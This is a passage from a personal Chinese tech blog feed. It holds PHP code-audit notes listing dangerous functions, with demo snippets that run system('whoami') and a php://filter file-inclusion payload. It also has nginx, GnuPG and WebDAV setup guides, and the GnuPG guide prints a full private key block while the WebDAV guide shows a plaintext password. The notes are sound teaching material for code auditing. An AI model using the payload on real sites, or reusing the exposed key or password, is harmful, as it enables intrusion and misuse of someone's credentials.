程序代码处理-&gt;程序代码<br>显式输入： 用户传递数据-&gt; 程序代码处理</p><p><a id="org8eab023"></a></p><h2 id="代码审计常见思路"><a href="#代码审计常见思路" class="headerlink" title="代码审计常见思路"></a>代码审计常见思路</h2><ul><li>  正向追踪： 变量  &#x2013;&gt; 函数</li><li>  逆向追踪： 函数  &#x2013;&gt; 变量</li><li>  常见功能点定向审计</li><li>  第三方组件,中间件版本比对</li><li>  补丁比对，反推漏洞位置</li><li>  工具扫描+人工验证</li></ul><p><a id="orgd90071d"></a></p><h2 id="Untrusted-Data-使用不可信的数据"><a href="#Untrusted-Data-使用不可信的数据" class="headerlink" title="Untrusted Data ,使用不可信的数据"></a>Untrusted Data ,使用不可信的数据</h2><p><code>$_REQUEST</code> 参数中的数据是浏览器可控的，黑客可以通过巧妙的构造覆盖PHP全局参数</p><p><a id="org593992a"></a></p><h2 id="Command-Execution-命令执行"><a href="#Command-Execution-命令执行" class="headerlink" title="Command Execution, 命令执行"></a>Command Execution, 命令执行</h2><p>PHP中存在敏感函数可以执行系统命令，常见这类函数如下：</p><pre><code>execshell_execsystempassthrupopenproc_openpcntl_exec</code></pre><p><a id="orgaf7a00a"></a></p><h2 id="Code-Execution-代码执行"><a href="#Code-Execution-代码执行" class="headerlink" title="Code Execution, 代码执行"></a>Code Execution, 代码执行</h2><p>PHP中存在敏感函数可以执行PHP代码段，常见函数如下：</p><pre><code>evalassertpreg_replacecreate_function</code></pre><p><a id="org00773a4"></a></p><h2 id="Information-Discloure-信息泄露"><a href="#Information-Discloure-信息泄露" class="headerlink" title="Information Discloure, 信息泄露"></a>Information Discloure, 信息泄露</h2><p>常见信息泄露的函数有 <code>phpinfo~、~show_source</code></p><p><a id="org9c1cc21"></a></p><h2 id="Insecure-Cryptographic-Functions-不安全的加密函数"><a href="#Insecure-Cryptographic-Functions-不安全的加密函数" class="headerlink" title="Insecure Cryptographic Functions, 不安全的加密函数"></a>Insecure Cryptographic Functions, 不安全的加密函数</h2><ul><li>  md5</li><li>  CRYPT<sub>STD</sub><sub>DES</sub></li><li>  CRYPT<sub>EXT</sub><sub>DES</sub></li><li>  CRYTPT<sub>MD5等</sub></li></ul><p><a id="org7fd6349"></a></p><h1 id="常见危险函数"><a href="#常见危险函数" class="headerlink" title="常见危险函数"></a>常见危险函数</h1><p><a id="orgd42787f"></a></p><h2 id="代码执行函数"><a href="#代码执行函数" class="headerlink" title="代码执行函数"></a>代码执行函数</h2><ul><li><p>  <code>eval()</code></p></li><li><p>  <code>assert()</code></p></li><li><p>  <code>preg_replace</code></p></li><li><p>  <code>create_funtion</code></p></li><li><p>  <code>call_user_func</code></p></li><li><p><code>call_user_func_array</code></p><pre><code>  @eval(&#39;echo &quot;test-echo&quot;;&#39;);  echo &#39;&lt;hr&gt;&#39;;  assert(&#39;system(&quot;whoami&quot;)&#39;);  // preg_replace(&quot;/test/e&quot;,&quot;phpinfo();&quot;,&quot;just test&quot;);  echo &#39;&lt;hr&gt;&#39;;  $cfunc=create_function(&#39;$v&#39;,&#39;return system($v);&#39;);  $cfunc(&#39;whoami&#39;);  echo &#39;&lt;hr&gt;&#39;;  $sfunc=&#39;sys&#39;.&#39;tem&#39;;  $sfunc(&#39;whoami&#39;);  echo &#39;&lt;hr&gt;&#39;;  function callback($var)&#123;           echo &quot;call test $var&quot;;  &#125;  call_user_func(&#39;callback&#39;,&#39;crkmyth1cal&#39;);</code></pre></li></ul><p><a id="orga4dc3ae"></a></p><h2 id="包含函数"><a href="#包含函数" class="headerlink" title="包含函数"></a>包含函数</h2><ul><li><p>  <code>require</code></p></li><li><p>  <code>include</code></p></li><li><p>  <code>require_once</code></p></li><li><p><code>include_once</code></p><p>  include $file;</p><p>  include($_GET[‘file’]);<br>  //     ?file=php://filter/convert.base64-encode/resource=index.php</p></li></ul><p><a id="orgb5e23c0"></a></p><h2 id="命令执行函数"><a href="#命令执行函数" class="headerlink" title="命令执行函数"></a>命令执行函数</h2><ul><li><p>  <code>exec</code></p></li><li><p>  <code>system</code></p></li><li><p>  <code>popen</code></p></li><li><p>  <code>proc_open</code></p></li><li><p>  <code>passthru</code></p></li><li><p><code>shell_exec</code></p><p>  echo shell_exec(‘ping <a href="http://www.baidu.com&/#39;">www.baidu.com&#39;</a>);<br>  echo shell_exec(‘whoami’);</p></li></ul><p><a id="org7b93cfd"></a></p><h2 id="文件操作函数"><a href="#文件操作函数" class="headerlink" title="文件操作函数"></a>文件操作函数</h2><p>读取：读取配置文件，获取key<br>写入：写入shell代码<br>删除：删除 <code>.lock</code> 文件，重新安装</p><ul><li><p>  <code>copy</code></p></li><li><p>  <code>file_get_contents</code></p></li><li><p>  <code>file_put_contents</code></p></li><li><p>  <code>file</code></p></li><li><p>  <code>glob</code></p></li><li><p>  <code>fopen</code></p></li><li><p>  <code>move_uploaded_file</code></p></li><li><p>  <code>readfile</code></p></li><li><p>  <code>rename</code></p></li><li><p>  <code>delete</code></p></li><li><p>  <code>rmdir</code></p></li><li><p>  <code>unlink</code></p></li><li><p>  <code>symlink</code></p></li><li><p><code>readlink</code></p><pre><code>  file_put_contents(&quot;baidu.txt&quot;,file_get_contents(&quot;https://www.baidu.com&quot;));  unlink(&#39;baidu.txt&#39;);</code></pre></li></ul><p><a id="org8ef722f"></a></p><h2 id="特殊函数"><a href="#特殊函数" class="headerlink" title="特殊函数"></a>特殊函数</h2><ul><li>  <code>phpinfo</code></li><li>  <code>getenv</code></li><li>  <code>putenv</code></li><li>  <code>dl</code></li><li>  <code>ini_get</code></li><li>  <code>ini_set</code></li><li>  <code>ini_alter</code></li><li>  <code>ini_restore</code></li><li>  <code>is_numeric</code></li><li>  <code>in_array</code></li></ul><p><a id="orgabca0d4"></a></p><h2 id="变量覆盖"><a href="#变量覆盖" class="headerlink" title="变量覆盖"></a>变量覆盖</h2><ul><li>  <code>parse_str</code></li><li>  <code>mb_parse_str</code></li><li>  <code>extract</code></li><li>  <code>import_request_variables</code></li><li>  <code>get_defined_vars</code></li><li>  <code>get_defined_constants</code></li><li>  <code>get_defined_functions</code></li><li>  <code>get_included_files</code></li></ul><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> Coding </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Mac下搭建Nginx+php开发平台</title>
      <link href="Tools/Mac%E4%B8%8B%E6%90%AD%E5%BB%BANginx-php%E5%BC%80%E5%8F%91%E5%B9%B3%E5%8F%B0.html"/>
      <url>Tools/Mac%E4%B8%8B%E6%90%AD%E5%BB%BANginx-php%E5%BC%80%E5%8F%91%E5%B9%B3%E5%8F%B0.html</url>
      
        <content type="html"><![CDATA[<p>编写进度</p><ul><li><input checked="" disabled="" type="checkbox"> </li></ul><h1 id="Table-of-Contents"><a href="#Table-of-Contents" class="headerlink" title="Table of Contents"></a>Table of Contents</h1><ol><li><a href="#org5a512c0">软件安装</a><ol><li> <a href="#orge939893">配置路径</a></li></ol></li></ol><p><a id="org5a512c0"></a></p><h1 id="软件安装"><a href="#软件安装" class="headerlink" title="软件安装"></a>软件安装</h1><ul><li><p>  php-fpm : FastCGI进城管理器(mac自带)</p></li><li><p>nginx : 高性能的HTTP和反向代理web服务器</p><pre><code>brew install nginxUpdating Homebrew...==&gt; Downloading from https://pkg-containers.githubusercontent.com/ghcr1/blobs/sha256:8ba34676e573272aa1f73d4dcf6bfddbaa69746a92bf812f6760b######################################################################## 100.0%==&gt; Pouring nginx--1.21.1.big_sur.bottle.tar.gz==&gt; CaveatsDocroot is: /usr/local/var/wwwThe default port has been set in /usr/local/etc/nginx/nginx.conf to 8080 so thatnginx can run without sudo.nginx will load all files in /usr/local/etc/nginx/servers/.To have launchd start nginx now and restart at login:  brew services start nginxOr, if you don&#39;t want/need a background service you can just run:  nginx==&gt; Summary🍺  /usr/local/Cellar/nginx/1.21.1: 25 files, 2.2MB</code></pre><p>  brew services start nginx  # 开机自启nginx</p></li></ul><p><a id="orge939893"></a></p><h2 id="配置路径"><a href="#配置路径" class="headerlink" title="配置路径"></a>配置路径</h2><ul><li><p>  nginx安装路径 <code>/usr/local/Cellar/nginx/1.21.1</code></p></li><li><p>  nginx配置文件 <code>/usr/local/etc/nginx/nginx.conf</code></p></li><li><p>  Docroot <code>/usr/local/var/www</code></p></li><li><p>php-fpm配置文件 <code>/etc/php-fpm.conf.default</code></p><p>  cp /private/etc/php-fpm.conf.default /private/etc/php-fpm.conf<br>  cp /private/etc/php-fpm.d/<a href="http://www.conf.default/">www.conf.default</a> /private/etc/php-fpm.d/<a href="http://www.conf/">www.conf</a></p></li><li><p>创建error<sub>log文件</sub></p><pre><code>  mkdir /usr/local/var/log/php-fpm  touch /usr/local/var/log/php-fpm/php-fpm.log  //修改php-fpm.conf  error_log = /usr/local/var/log/php-fpm/php-fpm.log</code></pre></li></ul><p>参考：<br><a href="https://segmentfault.com/a/1190000025138860">基于Mac自带nginx,php配置php运行环境</a></p><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> Tools </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>GnuPG使用教程</title>
      <link href="Tools/GnuPG%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B.html"/>
      <url>Tools/GnuPG%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B.html</url>
      
        <content type="html"><![CDATA[<p>编写进度</p><ul><li><input checked="" disabled="" type="checkbox"> </li></ul><h1 id="Table-of-Contents"><a href="#Table-of-Contents" class="headerlink" title="Table of Contents"></a>Table of Contents</h1><ol><li><a href="#org99fae5b">Gnu PG基本操作</a><ol><li> <a href="#org93134f5">生成公/私钥</a></li><li> <a href="#org1f0eac3">更改密钥密码</a></li><li> <a href="#org727b018">列出公/私钥</a></li><li> <a href="#org3966672">导出公/私钥</a></li><li> <a href="#org81de83f">导入公/私钥</a></li><li> <a href="#org76bf1ce">验证公钥</a></li><li> <a href="#orgd8946c4">删除公钥/私钥</a></li><li> <a href="#orgaa85092">废除密钥</a></li><li> <a href="#org46449e8">exchange on keyservers</a></li></ol></li><li><a href="#orgc92c582">应用-加解密文件</a><ol><li> <a href="#org0c7f3d4">公钥方式</a></li><li> <a href="#org55024ed">对称密码方法</a></li></ol></li><li><a href="#org101dfb7">应用-数字签名</a><ol><li> <a href="#org02dfb61">私钥创建,公钥验证</a></li></ol></li></ol><p><a id="org99fae5b"></a></p><h1 id="Gnu-PG基本操作"><a href="#Gnu-PG基本操作" class="headerlink" title="Gnu PG基本操作"></a>Gnu PG基本操作</h1><p><code>brew install gpg</code></p><p><a id="org93134f5"></a></p><h2 id="生成公-私钥"><a href="#生成公-私钥" class="headerlink" title="生成公/私钥"></a>生成公/私钥</h2><pre><code>gpg --gen-keygpg (GnuPG) 2.3.1; Copyright (C) 2021 Free Software Foundation, Inc.This is free software: you are free to change and redistribute it.There is NO WARRANTY, to the extent permitted by law.gpg: directory &#39;/Users/crkmyth1cal/.gnupg&#39; createdgpg: keybox &#39;/Users/crkmyth1cal/.gnupg/pubring.kbx&#39; createdNote: Use &quot;gpg --full-generate-key&quot; for a full featured key generation dialog.GnuPG needs to construct a user ID to identify your key.Real name: crkmyth1calEmail address: crkmyth1cal@protonmail.comYou selected this USER-ID:    &quot;crkmyth1cal &lt;crkmyth1cal@protonmail.com&gt;&quot;Change (N)ame, (E)mail, or (O)kay/(Q)uit? OWe need to generate a lot of random bytes. It is a good idea to performsome other action (type on the keyboard, move the mouse, utilize thedisks) during the prime generation; this gives the random numbergenerator a better chance to gain enough entropy.We need to generate a lot of random bytes. It is a good idea to performsome other action (type on the keyboard, move the mouse, utilize thedisks) during the prime generation; this gives the random numbergenerator a better chance to gain enough entropy.gpg: /Users/crkmyth1cal/.gnupg/trustdb.gpg: trustdb createdgpg: key AA72032823A2ECCA marked as ultimately trustedgpg: directory &#39;/Users/crkmyth1cal/.gnupg/openpgp-revocs.d&#39; createdgpg: revocation certificate stored as &#39;/Users/crkmyth1cal/.gnupg/openpgp-revocs.d/CDD514503006241E57352861AA72032823A2ECCA.rev&#39;public and secret key created and signed.pub   ed25519 2021-06-19 [SC] [expires: 2023-06-19]      CDD514503006241E57352861AA72032823A2ECCAuid                      crkmyth1cal &lt;crkmyth1cal@protonmail.com&gt;sub   cv25519 2021-06-19 [E] [expires: 2023-06-19]</code></pre><p><a id="org1f0eac3"></a></p><h2 id="更改密钥密码"><a href="#更改密钥密码" class="headerlink" title="更改密钥密码"></a>更改密钥密码</h2><pre><code>gpg --change-passphrase crkmyth1calgpg (GnuPG) 2.3.1; Copyright (C) 2021 Free Software Foundation, Inc.This is free software: you are free to change and redistribute it.There is NO WARRANTY, to the extent permitted by law.</code></pre><p><a id="org727b018"></a></p><h2 id="列出公-私钥"><a href="#列出公-私钥" class="headerlink" title="列出公/私钥"></a>列出公/私钥</h2><pre><code>gpg --list-keys  # or -k/Users/crkmyth1cal/.gnupg/pubring.kbx-------------------------------------pub   ed25519 2021-06-19 [SC] [expires: 2023-06-19]      CDD514503006241E57352861AA72032823A2ECCAuid           [ultimate] crkmyth1cal &lt;crkmyth1cal@protonmail.com&gt;sub   cv25519 2021-06-19 [E] [expires: 2023-06-19]gpg --list-secret-key # or -K/Users/crkmyth1cal/.gnupg/pubring.kbx-------------------------------------sec   ed25519 2021-06-19 [SC] [expires: 2023-06-19]      CDD514503006241E57352861AA72032823A2ECCAuid           [ultimate] crkmyth1cal &lt;crkmyth1cal@protonmail.com&gt;ssb   cv25519 2021-06-19 [E] [expires: 2023-06-19]</code></pre><p><a id="org3966672"></a></p><h2 id="导出公-私钥"><a href="#导出公-私钥" class="headerlink" title="导出公/私钥"></a>导出公/私钥</h2><pre><code>gpg -a -o crkmyth1cal.gpg  --export crkmyth1cal@protonmail.com-----BEGIN PGP PUBLIC KEY BLOCK-----mDMEYM1ptRYJKwYBBAHaRw8BAQdAaHUGQrDArp3fZYv3MxlT6yxP9/CW5wAgdP7nLfqz4MO0KGNya215dGgxY2FsIDxjcmtteXRoMWNhbEBwcm90b25tYWlsLmNvbT6ImgQTFgoAQhYhBM3VFFAwBiQeVzUoYapyAygjouzKBQJgzWm1AhsDBQkDwmcABQsJCAcCAyICAQYVCgkICwIEFgIDAQIeBwIXgAAKCRCqcgMoI6LsynziAQCa+VwORih0H2Ycnx8vaM4hwr1iyySb3Bb5o0caHdeu3QEAzBAaIX6JnVPJnIskca6b+k+iJJsWB0xG/GTwp/G5Egi4OARgzWm1EgorBgEEAZdVAQUBAQdAmrrwVy7J5GgqpA9PfB63oTVQAKR/w6aARrqQ7VNybWYDAQgHiH4EGBYKACYWIQTN1RRQMAYkHlc1KGGqcgMoI6LsygUCYM1ptQIbDAUJA8JnAAAKCRCqcgMoI6LsyiSuAQD2PfSX8REDV34euf9DRoBg0uKhLTgQtgm2zeEcpm+0UAD/V4KzFUFrwMqHComhztuWLEWiCZdvRn1n+n4vvYFYggQ==3qda-----END PGP PUBLIC KEY BLOCK-----gpg -ao crkmyth1cal@protonmail.com.private.key  --export-secret-keys crkmyth1cal@protonmail.com-----BEGIN PGP PRIVATE KEY BLOCK-----lIYEYM1ptRYJKwYBBAHaRw8BAQdAaHUGQrDArp3fZYv3MxlT6yxP9/CW5wAgdP7nLfqz4MP+BwMClpMTsR0QrB7z+mUYYoXKHAVO6Sx8Qou3jDkh+13GjO8T0BKtvJxp4gg+ycTou2JKSF79LJPTVJKMxO+qVL9ZoXNKPMroumiraVtFKp2OOrQoY3JrbXl0aDFjYWwgPGNya215dGgxY2FsQHByb3Rvbm1haWwuY29tPoiaBBMWCgBCFiEEzdUUUDAGJB5XNShhqnIDKCOi7MoFAmDNabUCGwMFCQPCZwAFCwkIBwIDIgIBBhUKCQgLAgQWAgMBAh4HAheAAAoJEKpyAygjouzKfOIBAJr5XA5GKHQfZhyfHy9oziHCvWLLJJvcFvmjRxod167dAQDMEBohfomdU8mciyRxrpv6T6IkmxYHTEb8ZPCn8bkSCJyLBGDNabUSCisGAQQBl1UBBQEBB0CauvBXLsnkaCqkD098HrehNVAApH/DpoBGupDtU3JtZgMBCAf+BwMC3RGXbNzVlWDz4USVVz26VGm7Wo8VSovee7SFJ2YXwFbx0//u5luXDYhKK7iTrtjDQqMXk1LOnOdO1HM5nn0uD5N5eTgRKfiDBLZRYRXxaIh+BBgWCgAmFiEEzdUUUDAGJB5XNShhqnIDKCOi7MoFAmDNabUCGwwFCQPCZwAACgkQqnIDKCOi7MokrgEA9j30l/ERA1d+Hrn/Q0aAYNLioS04ELYJts3hHKZvtFAA/1eCsxVBa8DKhwqJoc7blixFogmXb0Z9Z/p+L72BWIIE=hdmV-----END PGP PRIVATE KEY BLOCK-----</code></pre><p><a id="org81de83f"></a></p><h2 id="导入公-私钥"><a href="#导入公-私钥" class="headerlink" title="导入公/私钥"></a>导入公/私钥</h2><pre><code>gpg --import crkmyth1cal.gpggpg --import crkmyth1cal.private.keygpg: key AA72032823A2ECCA: &quot;crkmyth1cal &lt;crkmyth1cal@protonmail.com&gt;&quot; not changedgpg: key AA72032823A2ECCA: secret key importedgpg: Total number processed: 1gpg:              unchanged: 1gpg:       secret keys read: 1gpg:  secret keys unchanged: 1</code></pre><p><a id="org76bf1ce"></a></p><h2 id="验证公钥"><a href="#验证公钥" class="headerlink" title="验证公钥"></a>验证公钥</h2><pre><code>gpg --edit-key crkmyth1calgpg (GnuPG) 2.3.1; Copyright (C) 2021 Free Software Foundation, Inc.This is free software: you are free to change and redistribute it.There is NO WARRANTY, to the extent permitted by law.Secret key is available.sec  ed25519/AA72032823A2ECCA     created: 2021-06-19  expires: 2023-06-19  usage: SC     trust: ultimate      validity: ultimatessb  cv25519/603F4ACEF55D04B2     created: 2021-06-19  expires: 2023-06-19  usage: E[ultimate] (1). crkmyth1cal &lt;crkmyth1cal@protonmail.com&gt;gpg&gt; fpr  # fingerprintpub   ed25519/AA72032823A2ECCA 2021-06-19 crkmyth1cal &lt;crkmyth1cal@protonmail.com&gt; Primary key fingerprint: CDD5 1450 3006 241E 5735  2861 AA72 0328 23A2 ECCAgpg&gt; sign&quot;crkmyth1cal &lt;crkmyth1cal@protonmail.com&gt;&quot; was already signed by key AA72032823A2ECCANothing to sign with key AA72032823A2ECCAgpg&gt; quit</code></pre><p><a id="orgd8946c4"></a></p><h2 id="删除公钥-私钥"><a href="#删除公钥-私钥" class="headerlink" title="删除公钥/私钥"></a>删除公钥/私钥</h2><pre><code>gpg --delete-key crkmyth1cal@protonmail.comgpg --delete-secret-key crkmyth1cal@protonmail.com</code></pre><p><a id="orgaa85092"></a></p><h2 id="废除密钥"><a href="#废除密钥" class="headerlink" title="废除密钥"></a>废除密钥</h2><pre><code>gpg  --output revoke.asc  --gen-revoke crkmyth1cal@protonmail.com                                                                130 ↵sec  ed25519/AA72032823A2ECCA 2021-06-19 crkmyth1cal &lt;crkmyth1cal@protonmail.com&gt;Create a revocation certificate for this key? (y/N) yPlease select the reason for the revocation:  0 = No reason specified  1 = Key has been compromised  2 = Key is superseded  3 = Key is no longer used  Q = Cancel(Probably you want to select 1 here)Your decision? 3Enter an optional description; end it with an empty line:&gt; I&#39;m not used this key&gt;Reason for revocation: Key is no longer usedI&#39;m not used this keyIs this okay? (y/N) yASCII armored output forced.Revocation certificate created.Please move it to a medium which you can hide away; if Mallory getsaccess to this certificate he can use it to make your key unusable.It is smart to print this certificate and store it away, just in caseyour media become unreadable.  But have some caution:  The print system ofyour machine might store the data and make it available to others!gpg --import revoke.ascgpg --send-keys  crkmyth1cal@protonmail.com</code></pre><p><a id="org46449e8"></a></p><h2 id="exchange-on-keyservers"><a href="#exchange-on-keyservers" class="headerlink" title="exchange on keyservers"></a>exchange on keyservers</h2><pre><code>gpg --refresh-keys  # update all keys from a keyservergpg: refreshing 1 key from hkps://hkps.pool.sks-keyservers.netgpg: key 32B25331509A6D85: &quot;crkmyth1cal &lt;crkmyth1cal@protonmail.com&gt;&quot; not changedgpg: Total number processed: 1gpg:              unchanged: 1# 发送key ID到keyservergpg --send-keys 9001430FA52D253633CB1B8D32B25331509A6D85                                                                           2 ↵gpg: sending key 32B25331509A6D85 to hkps://hkps.pool.sks-keyservers.netgpg --search-keys ethan hunter  # search key and importgpg: data source: https://hkps.pool.sks-keyservers.net:443(1)    Ethan Hunter &lt;Ethanhunter@cock.li&gt;      2048 bit RSA key E6F7CD04BD975343, created: 2018-05-12, expires: 2020-05-12 (expired)Keys 1-1 of 1 for &quot;ethan hunter&quot;.  Enter number(s), N)ext, or Q)uit &gt; 1gpg: key E6F7CD04BD975343: public key &quot;Ethan Hunter &lt;Ethanhunter@cock.li&gt;&quot; importedgpg: Total number processed: 1gpg:               imported: 1# import keys from a keyservergpg --receive-keys B9c0165fgpg: key C7BA956CB9C0165F: public key &quot;ethan &lt;askding@bugbank.cn&gt;&quot; importedgpg: Total number processed: 1gpg:               imported: 1</code></pre><p><a id="orgc92c582"></a></p><h1 id="应用-加解密文件"><a href="#应用-加解密文件" class="headerlink" title="应用-加解密文件"></a>应用-加解密文件</h1><p><a id="org0c7f3d4"></a></p><h2 id="公钥方式"><a href="#公钥方式" class="headerlink" title="公钥方式"></a>公钥方式</h2><pre><code># encryptgpg  -ao msg.txt.gpg  -r crkmyth1cal   -e msg.txt  # -r = --recipient ,many recipient use : -r askDing -r crkmyth1cal -----BEGIN PGP MESSAGE-----hF4DYD9KzvVdBLISAQdAsW4ri+FuwxVn0pE1/WGl0hsmKL+j5+hWiXRohZFeXGgw9PDAlAPE5icl3aKaOH2ZLVPaGLerGjRVZDopJqmAH812IPvlZHtZdRSPvBhb39dr1GkBCQIV1TBYqTyxBsdFBrkOmc9dVS2/720cTcwoEISGa6RRAvzj1wIFDaP9yW0giA9TybkoHWaM0Gfa2Zb9d3I2FGfV+wnusWr1zl8HUGxQ+HwxaJi0PvRM1T1LZHla+qOU2zzdLNNlXP0==E0w0-----END PGP MESSAGE-----# decryptgpg -o msg.txt -d msg.txt.gpggpg: encrypted with cv25519 key, ID 603F4ACEF55D04B2, created 2021-06-19      &quot;crkmyth1cal &lt;crkmyth1cal@protonmail.com&gt;&quot;</code></pre><p><a id="org55024ed"></a></p><h2 id="对称密码方法"><a href="#对称密码方法" class="headerlink" title="对称密码方法"></a>对称密码方法</h2><pre><code>#encryptgpg -ao msg.txt.symmetric.gpg  -c msg.txt  # -c as --symmetric-----BEGIN PGP MESSAGE-----jA0ECQMCDFhZquLMGzHz0loBJfOjQIg8gbP4LwMYHQ1dJzPmEjwPRR9WcT0OffXqXqjk0ku3bUCXhKcx4FTmapleTSDJUBqHRNmBf94F2cbnSt+JUJZNpyPkY447wDneSYkxccKlP67k+Ro==6Q3U-----END PGP MESSAGE-----# decryptgpg -o msg.txt  -d msg.txt.symmetric.gpggpg: AES256.CFB encrypted datagpg: encrypted with 1 passphrase</code></pre><p><a id="org101dfb7"></a></p><h1 id="应用-数字签名"><a href="#应用-数字签名" class="headerlink" title="应用-数字签名"></a>应用-数字签名</h1><p><a id="org02dfb61"></a></p><h2 id="私钥创建-公钥验证"><a href="#私钥创建-公钥验证" class="headerlink" title="私钥创建,公钥验证"></a>私钥创建,公钥验证</h2><pre><code># signgpg -ao msg.txt.sign -s msg.txt  # -s as --sign-----BEGIN PGP MESSAGE-----owGbwMvMwCVmtCnYMGBWbivjGp0k9tzidL2SipKEs02PSjIyixWAKFEhObE4VSE/TSE1L7mosqBEIS0zJ5Wro5SFQYyLQVZMkWUCozP/Ul1VM+PT0r0w01iZQGYwcHEKwEQWf2Vk2J26+Yxx+Y4vEWt5l2w8+HDx97CNWmeVDZfnrN7XlPemvp+R4YTTtZ2HxGVayz76q6yb1eRmfiuWbW/wHB3fzS0niydJsQIA=GoIj-----END PGP MESSAGE-----# verify gpg --verify msg.txt.signgpg: Signature made Sat Jun 19 13:38:42 2021 CSTgpg:                using EDDSA key 9001430FA52D253633CB1B8D32B25331509A6D85gpg: Good signature from &quot;crkmyth1cal &lt;crkmyth1cal@protonmail.com&gt;&quot; [ultimate]# verify and restoregpg -o msg.txt -d msg.txt.signgpg: Signature made Sat Jun 19 13:38:42 2021 CSTgpg:                using EDDSA key 9001430FA52D253633CB1B8D32B25331509A6D85gpg: Good signature from &quot;crkmyth1cal &lt;crkmyth1cal@protonmail.com&gt;&quot; [ultimate]</code></pre><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> Tools </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>在Linux使用apache2搭建webdav服务</title>
      <link href="Tools/%E5%9C%A8Linux%E4%BD%BF%E7%94%A8apache2%E6%90%AD%E5%BB%BAwebdav%E6%9C%8D%E5%8A%A1.html"/>
      <url>Tools/%E5%9C%A8Linux%E4%BD%BF%E7%94%A8apache2%E6%90%AD%E5%BB%BAwebdav%E6%9C%8D%E5%8A%A1.html</url>
      
        <content type="html"><![CDATA[<p>编写进度</p><ul><li><input checked="" disabled="" type="checkbox"> </li></ul><h2 id="安装apache2并启用dav模块"><a href="#安装apache2并启用dav模块" class="headerlink" title="安装apache2并启用dav模块"></a>安装apache2并启用dav模块</h2><pre><code class="bash">sudo apt install -y apache2 sudo a2enmod dav dav_fs dav_lock auth_digest</code></pre><h2 id="创建webdav目录及DavLockDB文件"><a href="#创建webdav目录及DavLockDB文件" class="headerlink" title="创建webdav目录及DavLockDB文件"></a>创建webdav目录及DavLockDB文件</h2><pre><code class="bash">sudo mkdir /var/webdavsudo chown www-data:www-data /var/webdavsudo touch /var/DavLocksudo chown www-data:www-data /var/DavLock</code></pre><h2 id="创建访问用户"><a href="#创建访问用户" class="headerlink" title="创建访问用户"></a>创建访问用户</h2><pre><code class="bash">sudo htpasswd -Bc /var/passwd.dav admin m,./sudo chmod 640 /var/passwd.davsudo chown www-data:www-data /var/passwd.davsudo htpasswd -B /var/passwd.dav admin2 m,./     # 新增用户sudo htpasswd -D /var/passwd.dav admin2</code></pre><h2 id="配置虚拟主机"><a href="#配置虚拟主机" class="headerlink" title="配置虚拟主机"></a>配置虚拟主机</h2><pre><code class="bash">cat &lt;&lt;EOF &gt;/etc/apache2/site-available/webdav.conf&lt;VirtualHost *:80&gt;    ServerAdmin webmaster@dummy-host.example.com    ServerName dummy-host.example.com    ServerAlias www.dummy-host.example.com    DocumentRoot  /var/webdav    ErrorLog &quot;/private/var/log/apache2/dummy-host.example.com-error_log&quot;    CustomLog &quot;/private/var/log/apache2/dummy-host.example.com-access_log&quot; common    Alias /webdav /var/webdav    &lt;Directory /var/webdav/&gt;      Options Indexes MultiViews      AllowOverride None      Order allow,deny      allow from all    &lt;/Directory&gt;    &lt;Location /webdav&gt;      Dav On      AuthType Basic      AuthName &quot;webDav&quot;      AuthUserFile /var/webdav/passwd.dav      Require valid-user    &lt;/Location&gt;&lt;/VirtualHost&gt;EOFsudo apachectl configtest  #测试配置文件</code></pre><h2 id="重启服务并测试"><a href="#重启服务并测试" class="headerlink" title="重启服务并测试"></a>重启服务并测试</h2><pre><code class="bash">service apache2 restartcadaver http://127.0.0.1/webdav</code></pre><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> Tools </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>App渗透测试</title>
      <link href="Evolution/App%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.html"/>
      <url>Evolution/App%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.html</url>
      
